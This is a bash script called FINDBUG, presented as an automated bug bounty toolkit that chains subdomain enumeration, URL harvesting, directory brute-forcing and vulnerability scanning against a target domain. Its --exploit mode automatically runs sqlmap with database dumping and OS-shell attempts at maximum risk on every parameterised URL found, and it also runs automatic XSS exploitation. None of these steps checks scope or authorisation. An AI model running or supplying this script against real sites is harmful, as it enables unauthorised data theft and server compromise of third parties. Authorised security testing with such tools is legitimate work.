#!/bin/bash

##############################################
#                FINDBUG v3.5                #
# Comprehensive Automated Bug Bounty Toolkit #
#           Author: Jeet Jhaveri             #
##############################################

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"
VERSION="3.5"
START_TIME=$(date +%s)

banner() {
  cat <<"EOF"

 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ  ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ       ‚ñà    ‚ñà‚ñà   ‚ñÑ‚ñà‚ñà‚ñà‚ñà  ‚ñÑ‚ñÑ‚ñÑ      
‚ñì‚ñà‚ñà   ‚ñí‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå ‚ñì‚ñà   ‚ñÄ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ     ‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñí ‚ñà‚ñà‚ñí ‚ñÄ‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    
‚ñí‚ñà‚ñà‚ñà‚ñà ‚ñë‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñë‚ñà‚ñà   ‚ñà‚ñå ‚ñí‚ñà‚ñà‚ñà  ‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà  ‚ñí‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñë‚ñÑ‚ñÑ‚ñÑ‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  
‚ñë‚ñì‚ñà‚ñí  ‚ñë‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí‚ñë‚ñì‚ñà‚ñÑ   ‚ñå ‚ñí‚ñì‚ñà  ‚ñÑ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñì‚ñì‚ñà  ‚ñë‚ñà‚ñà‚ñë‚ñë‚ñì‚ñà  ‚ñà‚ñà‚ñì‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà 
‚ñë‚ñí‚ñà‚ñë   ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì  ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí
 ‚ñí ‚ñë   ‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë ‚ñí‚ñí‚ñì  ‚ñí  ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë‚ñí‚ñì‚ñí ‚ñí ‚ñí  ‚ñë‚ñí   ‚ñí  ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë
 ‚ñë     ‚ñë‚ñí ‚ñë      ‚ñë ‚ñí  ‚ñí   ‚ñë ‚ñë  ‚ñë ‚ñí   ‚ñí‚ñí ‚ñë‚ñë‚ñë‚ñí‚ñë ‚ñë ‚ñë   ‚ñë   ‚ñë   ‚ñí   ‚ñí‚ñí ‚ñë
 ‚ñë ‚ñë   ‚ñë‚ñë        ‚ñë ‚ñë  ‚ñë     ‚ñë    ‚ñë   ‚ñí    ‚ñë‚ñë‚ñë ‚ñë ‚ñë ‚ñë ‚ñë   ‚ñë   ‚ñë   ‚ñí   
                    ‚ñë        ‚ñë  ‚ñë     ‚ñë  ‚ñë   ‚ñë           ‚ñë       ‚ñë  ‚ñë

FINDBUG $VERSION | Comprehensive Automated Bug Bounty Toolkit
Author: Jeet Jhaveri
EOF
}

log() { echo -e "${GREEN}[+] $1${RESET}"; }
warn() { echo -e "${YELLOW}[!] $1${RESET}"; }
error() { echo -e "${RED}[-] $1${RESET}"; }

spinner() {
  local pid=$1
  local spin='|/-\'
  local delay=0.1
  printf " "
  while ps -p $pid &>/dev/null; do
    for i in $(seq 1 5); do
      printf "\b${spin:i%4:1}"
      sleep $delay
    done
  done
  printf "\b \b"
}

usage() {
  echo -e "${BLUE}Usage: ./findbug.sh -u <target.com> [options]${RESET}
${YELLOW}Options:${RESET}
  ${GREEN}-u <domain>${RESET}       Target domain for scanning ${YELLOW}(required)${RESET}
  ${GREEN}--exploit${RESET}          Enable full exploitation mode (SQLDump, RCE checks, XSS Auto, etc.)
  ${GREEN}--install${RESET}         Install or update all dependencies
  ${GREEN}--version${RESET}         Display version information
  ${GREEN}-h, --help${RESET}        Show this help message
"
  exit 0
}

check_dependencies() {
  export PATH="$HOME/go/bin:$HOME/.local/bin:$PATH"
  local tools=(subfinder assetfinder amass httpx gau nuclei ffuf sqlmap jq trufflehog whatweb)
  for tool in "${tools[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      error "Missing dependency: $tool"
      warn "Run './findbug.sh --install' to install missing dependencies."
      exit 1
    fi
  done
}

smart_scan() {
  local DOMAIN=$1
  local EXPLOIT_MODE=$2
  local OUTDIR="scans/$DOMAIN"
  local WORDLIST="$HOME/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
  mkdir -p "$OUTDIR"
  cd "$OUTDIR" || exit 1

  run_spinner() {
    log "$1"
    shift
    "$@" &
    spinner $!
    echo
  }

  log "üîé Subdomain Enumeration"
  (
    subfinder -d $DOMAIN -silent
    assetfinder --subs-only $DOMAIN
    amass enum -passive -d $DOMAIN
  ) | sort -u | tee subdomains.txt

  log "üåê Probing alive subdomains"
  cat subdomains.txt | httpx -silent | tee alive.txt

  log "üóÇÔ∏è Directory brute-force with ffuf"
  [[ -f "$WORDLIST" ]] && ffuf -u https://$DOMAIN/FUZZ -w "$WORDLIST" -t 50 -o ffuf.json || warn "No wordlist for ffuf"

  log "üìú Collecting URLs from gau"
  cat alive.txt | gau | sort -u | tee urls_gau.txt

  log "üîë Finding endpoints with parameters"
  grep "=" urls_gau.txt | sort -u | tee urls_with_params.txt

  log "üß© Finding JavaScript files"
  grep -Ei "\.js($|\?)" urls_gau.txt | sort -u | tee javascript_files.txt

  log "üîê Scanning for secrets in JS"
  while read -r jsurl; do trufflehog filesystem "$jsurl"; done <javascript_files.txt || true

  log "üõ°Ô∏è Checking HTTP tech stack"
  cat alive.txt | whatweb -i - | tee whatweb.txt

  log "üö® Scanning with nuclei (CVEs, exposures, misconfigurations)"
  cat alive.txt | nuclei -severity low,medium,high,critical -o nuclei-results.txt

  log "üëª Subdomain takeover detection with subzy"
  cat subdomains.txt | subzy run || warn "subzy may require config"

  log "üíæ Extracting historical endpoints (waybackurls)"
  cat alive.txt | waybackurls | sort -u | tee waybackurls.txt

  log "üîç Finding hidden parameters (ParamSpider)"
  cd ~/tools/ParamSpider || true
  python3 paramspider.py --domain $DOMAIN --exclude woff,css,png,svg,ico,jpg,js -o $OUTDIR/paramspider.txt || true
  cd "$OUTDIR"

  if [[ "$EXPLOIT_MODE" == "true" ]]; then
    log "${RED}‚öîÔ∏è EXPLOIT MODE ENABLED${RESET}"

    log "üí£ SQL Injection Auto-Exploitation"
    for url in $(cat urls_with_params.txt); do
      echo -e "\n[SQLMAP] Testing $url"
      sqlmap -u "$url" --batch --level=5 --risk=3 --random-agent --threads=5 --dump --os-shell || true
    done

    log "‚ò†Ô∏è XSS Auto exploitation with XSStrike"
    cd ~/tools/XSStrike || true
    for url in $(cat "$OUTDIR/urls_with_params.txt"); do
      echo -e "\n[XSStrike] Testing $url"
      python3 xsstrike.py -u "$url" --crawl --auto || true
    done
    cd "$OUTDIR"

    log "üìú Exploit CVEs with specific nuclei templates"
    cat alive.txt | nuclei -t ~/nuclei-templates/exposures/ -severity critical,high || true
  else
    warn "üíª Exploitation skipped. Use --exploit to enable."
  fi

  local END_TIME=$(date +%s)
  local TOTAL_TIME=$((END_TIME - START_TIME))
  echo -e "${GREEN}‚úÖ Scan completed in ${TOTAL_TIME}s${RESET}"
}

######## MAIN ########
banner
case "$1" in
--install)
  bash ./install.sh
  exit 0
  ;;
--help | -h) usage ;;
--version)
  echo "FINDBUG v$VERSION"
  exit 0
  ;;
esac

DOMAIN=""
EXPLOIT_MODE="false"

while [[ $# -gt 0 ]]; do
  case "$1" in
  -u)
    DOMAIN="$2"
    shift 2
    ;;
  --exploit)
    EXPLOIT_MODE="true"
    shift
    ;;
  -h | --help) usage ;;
  *) shift ;;
  esac
done

[[ -z "$DOMAIN" ]] && usage
check_dependencies
smart_scan "$DOMAIN" "$EXPLOIT_MODE"
